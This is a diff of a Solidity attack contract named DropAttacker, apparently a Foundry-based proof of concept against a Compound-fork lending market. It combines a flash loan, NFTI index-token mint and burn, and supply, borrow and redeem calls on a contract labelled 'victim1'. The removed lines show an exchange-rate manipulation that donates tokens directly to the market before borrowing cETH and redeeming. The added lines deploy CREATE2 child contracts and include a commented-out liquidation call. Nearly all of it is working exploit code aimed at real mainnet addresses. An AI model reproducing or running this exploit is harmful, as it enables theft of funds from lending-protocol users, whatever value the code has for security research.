@@ -10,13 +10,23 @@ import "./IUnitroller.sol";
 import "./ICerc20.sol";
 import "./Swap.sol";
 import "./Executor.sol";
+import "./CreateChildren.sol";
 
-interface INFTI is IERC20 {
-    function mint(uint256 amount) external;
-    function burn(uint256 amount) external;
+interface CEtherInterface {
+    // function mint(uint256 amount) external;
+    // function burn(uint256 amount) external;
+    function liquidateBorrow(address borrower, CErc20Interface cTokenCollateral) external payable;    
 }
 
-contract DropAttacker is IFlashLoanReceiver, Swap, Executor, Test {
+contract DropAttacker is 
+    CreateChildren, 
+    IFlashLoanReceiver, 
+    Swap, 
+    Executor, 
+    Test 
+{
+
+    // CreateChildren cc;
 
     // Addresses
     // address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; //Main
@@ -90,8 +100,12 @@ contract DropAttacker is IFlashLoanReceiver, Swap, Executor, Test {
         uint256 balbNfti = balanceOfThis(NFTI);
         nfti.burn(balbNfti);    
 
-        transferToDrop();  
-        transferToDrop();  
+        // transferToDrop();  
+        // transferToDrop();  
+
+        address child = deployChildren(123);
+
+        // CEtherInterface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).liquidateBorrow{value:1e14}(child, victim1);
 
         {
         // nfti.approve(NFTI, uint256(2**256-1));
@@ -102,12 +116,14 @@ contract DropAttacker is IFlashLoanReceiver, Swap, Executor, Test {
         IERC20(0x929Fd5879847F41f05B6Cf3746b4343f38b8741B).approve(NFTI, balanceOfThis(0x929Fd5879847F41f05B6Cf3746b4343f38b8741B));//xSQGL
         IERC20(0x804bc39d5670ca176203556DAc06FCD7ED37DdB1).approve(NFTI, balanceOfThis(0x804bc39d5670ca176203556DAc06FCD7ED37DdB1));//xTOADZ
         IERC20(0xCb784233855C97d8532F8eeFA094bA876187A150).approve(NFTI, balanceOfThis(0xCb784233855C97d8532F8eeFA094bA876187A150));//xNoodle
-        nfti.mint(balbNfti-10e15);
+        nfti.mint(balbNfti-5e15);
         }
 
         uint256 balaNfti = balanceOfThis(NFTI);
         nfti.approve(_swapRouter, balaNfti);
         uniswapRouterSwap(NFTI, WETH, balaNfti, 0, 3000);
+
+
         // console.log("WETH balance :",);
         // weth.withdraw(balanceOfThis(WETH));
         uint256 amountOwned = amounts[0] + premiums[0] - balanceOfThis(WETH);
@@ -117,51 +133,18 @@ contract DropAttacker is IFlashLoanReceiver, Swap, Executor, Test {
         return true;
     }
 
-    function transferToDrop() internal {
-
-        address[] memory cTokens = new address[](2);
-        cTokens[0] = kERC20_1;  
-        cTokens[1] = kERC20_2;
-        uint[] memory errors = unitroller.enterMarkets(cTokens);
-
-        uint256 xmAmount = balanceOfThis(xMEEB);
-        uint256 xpAmount = balanceOfThis(xPUNK);
-
-        xmeeb.approve(kERC20_1, xmAmount);    
-        xpunk.approve(kERC20_2, xpAmount);
-        victim1.mint(xmAmount);
-        // victim2.mint(xpAmount);
-
-        {        
-            // console.log(errors[0]);            
-            victim1.redeem(victim1.balanceOf(address(this))-2);
-            // victim2.redeem(victim2.balanceOf(address(this))-2);
-       
-            uint256 transferAmountXm = balanceOfThis(xMEEB);
-            uint256 transferAmountXp = balanceOfThis(xPUNK);
-            xmeeb.transfer(kERC20_1, transferAmountXm);
-            // xpunk.transfer(kERC20_2, transferAmountXp);
-            
-            // console.log(victim1.exchangeRateStored());       
-            (uint a, uint b, uint c) = unitroller.getAccountLiquidity(address(this));
-            console.log("a :",a);
-            console.log("b :",b);
-            console.log("c :",c);
-         
-            // CErc20Interface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).borrow(80*10**17);//cETH
-            CErc20Interface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).borrow(23*10**17);//cETH
-            console.log("Before :",victim1.balanceOf(address(this)));
-
-            victim1.redeemUnderlying(transferAmountXm);
-            // victim2.redeemUnderlying(transferAmountXp);
-
-            //Test
-            console.log("xMEEB after balance :",balanceOfThis(xMEEB));
-            console.log("xPUNK after balance :",balanceOfThis(xPUNK));
-            console.log("After :",victim1.balanceOf(address(this)));
-            
-        }
+    function deployChildren(uint256 _solt) internal returns (address childAddress){
+        // console.log("bytecode :");
+        bytes memory bytecode = getBytecode();
+        // console.logBytes(bytecode);
+        
+        childAddress = getAddress(bytecode, _solt);
+        // console.log(childAddress); 
+        xmeeb.transfer(childAddress, balanceOfThis(xMEEB));
+        xpunk.transfer(childAddress, balanceOfThis(xPUNK));
+        deploy(bytecode, _solt);
     }
+
 
     function balanceOfThis(address _erc20TokenAddress) internal view returns (uint256 bal) {
         IERC20 ERC20Token;    
